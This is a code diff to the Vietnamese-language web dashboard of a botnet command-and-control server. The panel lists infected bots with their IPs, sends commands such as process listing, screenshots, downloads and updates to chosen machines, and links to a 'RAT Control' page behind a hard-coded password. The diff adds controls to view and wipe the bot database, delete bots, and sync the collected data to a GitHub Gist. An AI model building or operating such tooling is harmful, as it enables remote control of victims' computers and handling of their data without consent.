@@ -19,8 +19,7 @@
         .cmd-box { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
         .cmd-box input, .cmd-box select { padding: 10px; background: #1a1a2e; border: 1px solid #00ff8855; color: white; border-radius: 5px; flex: 1; min-width: 150px; }
         .cmd-box button { padding: 10px 30px; background: #00ff88; color: #0a0a0f; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .search { margin: 10px 0; }
-        .search input { padding: 10px; background: #1a1a2e; border: 1px solid #00ff8855; color: white; border-radius: 5px; width: 300px; }
+        .cmd-box button:hover { background: #00cc77; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1a1a2e; border-radius: 10px; overflow: hidden; }
         th { background: #00ff8822; color: #00ff88; padding: 12px; text-align: left; }
         td { padding: 10px 12px; border-bottom: 1px solid #00ff8811; }
@@ -30,12 +29,20 @@
         .btn:hover { background: #00cc77; }
         .btn-danger { background: #ff0044; color: white; }
         .btn-danger:hover { background: #cc0033; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
-        .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 600px; max-height: 80vh; overflow-y: auto; }
-        .modal-content pre { background: #0a0a0f; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; color: #00ff88; }
-        .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
         .btn-rat { background: #ff0044; color: white; padding: 8px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
         .btn-rat:hover { background: #cc0033; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
+        .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 700px; max-height: 80vh; overflow-y: auto; }
+        .modal-content pre { background: #0a0a0f; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; color: #00ff88; max-height: 400px; overflow-y: auto; }
+        .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
+        .db-actions { display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap; }
+        .db-actions button { padding: 8px 15px; background: #1a1a2e; border: 1px solid #00ff8855; color: #00ff88; border-radius: 5px; cursor: pointer; }
+        .db-actions button:hover { background: #00ff8822; }
+        .db-actions button.danger { border-color: #ff4444; color: #ff4444; }
+        .db-actions button.danger:hover { background: #ff444422; }
+        .gist-status { font-size: 12px; color: #888; margin: 5px 0; }
+        .gist-status .connected { color: #00ff88; }
+        .gist-status .disconnected { color: #ff4444; }
     </style>
 </head>
 <body>
@@ -45,6 +52,13 @@
             <div class="password-badge">🔑 H3XTEK0</div>
         </div>
 
+        <div class="gist-status" id="gistStatus">
+            <span>📦 GitHub Gist: </span>
+            <span id="gistStatusText" class="disconnected">Đang kiểm tra...</span>
+            <button onclick="checkGistStatus()" style="background:none;border:1px solid #00ff8855;color:#00ff88;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:11px;">Kiểm tra</button>
+            <button onclick="syncToGist()" style="background:none;border:1px solid #00ff8855;color:#00ff88;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:11px;">🔄 Sync</button>
+        </div>
+
         <div class="stats">
             <div class="stat-card"><div class="stat-number" id="totalBots">0</div><div class="stat-label">Tổng Bot</div></div>
             <div class="stat-card"><div class="stat-number" id="onlineBots">0</div><div class="stat-label">Online</div></div>
@@ -52,8 +66,10 @@
             <div class="stat-card"><div class="stat-number" id="groupsCount">0</div><div class="stat-label">Groups</div></div>
         </div>
 
-        <div style="margin: 20px 0;">
+        <div style="margin: 20px 0; display: flex; gap: 10px; flex-wrap: wrap;">
             <a href="/rat" class="btn-rat">🎯 Mở RAT Control</a>
+            <button onclick="viewDB()" class="btn">📊 Xem Database</button>
+            <button onclick="clearAllData()" class="btn-danger">🗑️ Xóa toàn bộ DB</button>
         </div>
 
         <div class="cmd-box">
@@ -61,10 +77,6 @@
             <input type="text" id="cmdInput" placeholder="Lệnh (ps, sc, ping, download, update...)" style="flex: 2;">
             <input type="text" id="argsInput" placeholder="Args (json array)">
             <button onclick="sendCommand()">🚀 Gửi lệnh</button>
-        </div>
-
-        <div class="search">
-            <input type="text" id="searchInput" placeholder="🔍 Tìm bot theo ID hoặc IP..." onkeyup="filterBots()">
         </div>
 
         <table>
@@ -82,6 +94,15 @@
             </thead>
             <tbody id="botsTable"></tbody>
         </table>
+    </div>
+
+    <!-- Modal xem Database -->
+    <div id="dbModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="document.getElementById('dbModal').style.display='none'">&times;</span>
+            <h3>📊 Toàn bộ Database</h3>
+            <pre id="dbContent">Đang tải...</pre>
+        </div>
     </div>
 
     <!-- Modal xem kết quả -->
@@ -132,6 +153,7 @@
                         <button class="btn" onclick="selectBot('${b.bot_id}')">Chọn</button>
                         <button class="btn" onclick="viewHistory('${b.bot_id}')">Lịch sử</button>
                         <button class="btn" onclick="viewResultLast('${b.bot_id}')">Kết quả cuối</button>
+                        <button class="btn-danger" onclick="deleteBot('${b.bot_id}')">Xóa</button>
                     </td>
                 `;
                 tbody.appendChild(tr);
@@ -149,17 +171,24 @@
             document.getElementById('groupsCount').textContent = groups;
         }
 
-        function filterBots() {
-            const search = document.getElementById('searchInput').value.toLowerCase();
-            const filtered = botsData.filter(b => 
-                b.bot_id.toLowerCase().includes(search) || 
-                (b.ip && b.ip.includes(search))
-            );
-            renderBots(filtered);
-        }
-
         function selectBot(botId) {
             document.getElementById('botIdInput').value = botId;
+        }
+
+        async function deleteBot(botId) {
+            if (!confirm(`Xóa bot ${botId.slice(0,8)}...?`)) return;
+            try {
+                const res = await fetch(`/api/bots/${botId}`, {
+                    method: 'DELETE',
+                    headers: getAuth()
+                });
+                if (res.ok) {
+                    alert('✅ Đã xóa bot');
+                    fetchBots();
+                }
+            } catch (e) {
+                alert('❌ Lỗi: ' + e.message);
+            }
         }
 
         async function sendCommand() {
@@ -253,9 +282,71 @@
             }
         }
 
+        async function viewDB() {
+            try {
+                const res = await fetch('/api/db', { headers: getAuth() });
+                const data = await res.json();
+                document.getElementById('dbContent').textContent = JSON.stringify(data, null, 2);
+                document.getElementById('dbModal').style.display = 'block';
+            } catch (e) {
+                alert('Lỗi: ' + e.message);
+            }
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ Xóa TOÀN BỘ database? Hành động này không thể hoàn tác!')) return;
+            if (!confirm('Xác nhận lần cuối: Xóa hết bot, lệnh, log?')) return;
+            try {
+                const res = await fetch('/api/db', {
+                    method: 'DELETE',
+                    headers: getAuth()
+                });
+                if (res.ok) {
+                    alert('✅ Đã xóa toàn bộ database');
+                    fetchBots();
+                }
+            } catch (e) {
+                alert('❌ Lỗi: ' + e.message);
+            }
+        }
+
+        async function checkGistStatus() {
+            try {
+                const res = await fetch('/api/db/sync', {
+                    method: 'POST',
+                    headers: getAuth()
+                });
+                const data = await res.json();
+                const el = document.getElementById('gistStatusText');
+                if (data.gist) {
+                    el.textContent = '✅ Connected to GitHub Gist';
+                    el.className = 'connected';
+                } else {
+                    el.textContent = '❌ Not configured (set GITHUB_TOKEN & GIST_ID)';
+                    el.className = 'disconnected';
+                }
+            } catch (e) {
+                document.getElementById('gistStatusText').textContent = '❌ Error checking';
+            }
+        }
+
+        async function syncToGist() {
+            try {
+                const res = await fetch('/api/db/sync', {
+                    method: 'POST',
+                    headers: getAuth()
+                });
+                const data = await res.json();
+                alert(`✅ Sync completed! Gist: ${data.gist ? 'Connected' : 'Not configured'}`);
+            } catch (e) {
+                alert('❌ Lỗi sync: ' + e.message);
+            }
+        }
+
         // Auto refresh
         setInterval(fetchBots, 5000);
         fetchBots();
+        checkGistStatus();
     </script>
 </body>
 </html>
